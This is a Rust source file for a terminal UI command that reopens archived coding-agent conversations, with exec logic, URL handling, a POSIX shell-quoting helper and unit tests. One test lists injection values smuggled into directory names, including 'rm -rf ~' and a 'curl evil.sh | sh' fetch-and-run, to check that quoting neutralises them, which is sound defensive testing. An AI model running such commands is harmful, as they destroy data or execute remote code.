//! Wiring for `cs tui`.
//!
//! Everything config-shaped lives here so `cs-tui` does not have to know it (docs/TUI-DESIGN.md
//! §1): this resolves the index path and the query log, and hands the TUI a sink. The TUI
//! resolves neither, which is what keeps it off `cs-archive`.

use anyhow::{Context, Result};
use cs_archive::Config;
use std::io::IsTerminal;
use std::path::{Path, PathBuf};

pub fn run(
    config_path: &Path,
    db_path: Option<PathBuf>,
    source: Option<&str>,
    limit: i64,
    print: bool,
) -> Result<()> {
    let cfg = Config::load(config_path)?;
    let db_path = db_path.unwrap_or_else(|| cfg.default_db());

    // Captured by the sink rather than read per event: the TUI can emit while the terminal
    // is still in raw mode, and re-reading the config there would be a filesystem hit inside
    // a keystroke path.
    let log_path = cfg.query_log();
    let log_queries = cfg.log_queries;
    let mut sink = |event: cs_core::querylog::Event| {
        // Same rule as everywhere else this is called: losing a log line costs a data point,
        // failing the action costs the thing that was asked for.
        if log_queries {
            let _ = cs_core::querylog::append(&log_path, &event);
        }
    };

    // Unlike `cs pick`, the TUI does not recompute the result list to find the rank — it
    // built the list, so it knows where the selection sat and emits the event itself.
    let opts = cs_tui::Opts {
        query: String::new(),
        source: source.map(String::from),
        limit,
    };

    match cs_tui::run(db_path, &mut sink, opts)? {
        cs_tui::Exit::Quit => Ok(()),
        cs_tui::Exit::Open { resume_cmd, cwd, .. } => {
            let Some(cmd) = resume_cmd else {
                // Some conversations have no reopen path at all — a claude.ai thread is not
                // resumable from a terminal. Saying so on stderr beats the TUI closing on
                // Enter and appearing to do nothing, which is indistinguishable from a bug.
                eprintln!("no way to reopen this conversation from here");
                return Ok(());
            };
            let cwd = cwd.filter(|d| !d.is_empty());
            // Handing over the terminal is only possible when we hold one. Under
            // `eval "$(cs tui)"` stdout is a pipe, and the agent would render into it; that
            // is the case the printing contract exists for, so it keeps printing.
            if print || !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal() {
                match cwd {
                    // `cd` is composed here, so the directory is *our* argument to quote.
                    // It arrives from a transcript, meaning its contents are whatever the
                    // source tool recorded, and this line is written to be `eval`ed — so an
                    // unquoted `~/Documents/My Project` breaks `cd`, and a directory named
                    // with a `;` runs whatever follows it.
                    Some(dir) => println!("cd {} && {cmd}", shell_quote(&dir)),
                    None => println!("{cmd}"),
                }
                return Ok(());
            }
            launch(&cmd, cwd.as_deref())
        }
    }
}

/// Replace this process with the agent, so it inherits the terminal directly.
///
/// **Nothing here may redirect a standard descriptor.** A crossterm TUI — Codex is one —
/// fails to build its event source when fd 0 is anything other than the terminal it was
/// started on, and a freshly-opened `/dev/tty` counts as *other*: registering that fd with
/// kqueue fails on macOS, which surfaces as "reader source not set" and, in Claude Code, as
/// a session that draws but never accepts a keystroke. `scripts/cs-fzf --run` adds
/// `< /dev/tty` believing it fixes this; measured under a pty it is the cause, and plain
/// inheritance is what works.
///
/// No shell is involved either. `$SHELL -lc` re-sources the whole rc chain first, and
/// anything in there that touches the terminal lands between us and the agent.
fn launch(cmd: &str, cwd: Option<&str>) -> Result<()> {
    let argv = argv_for(cmd);
    let Some((program, args)) = argv.split_first() else { return Ok(()) };

    let mut command = std::process::Command::new(program);
    command.args(args);
    // The directory becomes an argument rather than a `cd` composed into a shell line, so
    // nothing in it can be read as syntax.
    if let Some(dir) = cwd {
        command.current_dir(dir);
    }

    // Dim, on stderr, so it is visible without polluting the stdout contract.
    eprintln!("\x1b[2m{cmd}\x1b[0m");

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        // Only returns on failure; on success this process no longer exists, which is what
        // leaves no orphaned parent between the shell and the agent.
        let err = command.exec();
        Err(anyhow::Error::from(err)).with_context(|| format!("running {program}"))
    }
    #[cfg(not(unix))]
    {
        // No exec on Windows, so the parent stays alive and waits rather than exiting and
        // handing the terminal back while the agent is still drawing on it.
        let status = command.status().with_context(|| format!("running {program}"))?;
        std::process::exit(status.code().unwrap_or(1));
    }
}

/// Split a stored `resume_cmd` into an argv.
///
/// Whitespace splitting is enough because every command the importers generate is built from
/// an id with no spaces in it — `claude --resume <id>`, `codex resume <id>`. It is also all
/// that *can* be done with a pre-rendered string, which is the argument `me9.3` makes for
/// replacing the column with a structured open target; until then this is the same naive
/// split `scripts/cs-fzf` does.
///
/// A URL is not a command at all — 69% of this corpus resumes that way — so it becomes an
/// argument to the platform opener instead of a program name that would never resolve.
fn argv_for(cmd: &str) -> Vec<String> {
    if cmd.starts_with("http://") || cmd.starts_with("https://") {
        let opener = if cfg!(target_os = "macos") { "open" } else { "xdg-open" };
        return vec![opener.to_string(), cmd.to_string()];
    }
    cmd.split_whitespace().map(String::from).collect()
}

/// POSIX single-quote wrapping.
///
/// Single quotes suspend every shell expansion, so the only character needing care is `'`
/// itself: close the quote, emit an escaped one, reopen. Unquoted values are never emitted,
/// even when they look safe — "looks safe" is a judgement about today's corpus, and this
/// string is written to be `eval`ed.
///
/// `resume_cmd` is deliberately *not* run through this. It is a whole command line rather
/// than one argument, so quoting it would turn `claude --resume <id>` into a request to
/// execute a file with that name. That asymmetry is a symptom of `me9.3`: a structured
/// open-target would let this compose an argv and drop shell composition entirely.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

#[cfg(test)]
mod tests {
    use super::{argv_for, shell_quote};

    #[test]
    fn a_terminal_resume_command_becomes_a_program_and_its_arguments() {
        assert_eq!(argv_for("claude --resume s-1"), ["claude", "--resume", "s-1"]);
        assert_eq!(argv_for("codex resume 019f-main"), ["codex", "resume", "019f-main"]);
    }

    #[test]
    fn a_url_becomes_an_argument_to_the_opener_rather_than_a_program() {
        // Left alone it would be exec'd as a program name and never resolve, which is the
        // majority of this corpus failing to open at all.
        let argv = argv_for("https://chatgpt.com/c/conv-1");
        assert_eq!(argv.len(), 2, "opener plus the url, and no shell in between");
        assert!(matches!(argv[0].as_str(), "open" | "xdg-open"));
        assert_eq!(argv[1], "https://chatgpt.com/c/conv-1");
    }

    #[test]
    fn a_url_is_never_split_on_its_own_punctuation() {
        // A query string can carry anything; splitting it would hand the opener arguments
        // it never asked for.
        let argv = argv_for("https://chatgpt.com/c/a?b=1&c=2#frag");
        assert_eq!(argv[1], "https://chatgpt.com/c/a?b=1&c=2#frag");
    }

    #[test]
    fn an_empty_command_yields_no_program_to_run() {
        assert!(argv_for("   ").is_empty(), "callers must not exec an empty argv");
    }

    #[test]
    fn a_directory_with_spaces_survives_as_one_argument() {
        assert_eq!(shell_quote("/Users/me/My Project"), "'/Users/me/My Project'");
    }

    #[test]
    fn shell_metacharacters_lose_their_meaning() {
        for hostile in [
            "/tmp/x; rm -rf ~",
            "/tmp/x && curl evil.sh | sh",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/x\nrm -rf ~",
        ] {
            let quoted = shell_quote(hostile);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
            // Nothing between the quotes can close them, which is what makes the whole
            // value one word to the shell however it is spelled.
            assert!(!quoted[1..quoted.len() - 1].contains('\''));
        }
    }

    #[test]
    fn an_embedded_quote_is_escaped_rather_than_dropped() {
        // The one case single-quoting cannot handle by itself, and the one most likely to
        // be got wrong: `it's` must round-trip, not silently lose a character.
        assert_eq!(shell_quote("/tmp/it's here"), r"'/tmp/it'\''s here'");
    }
}
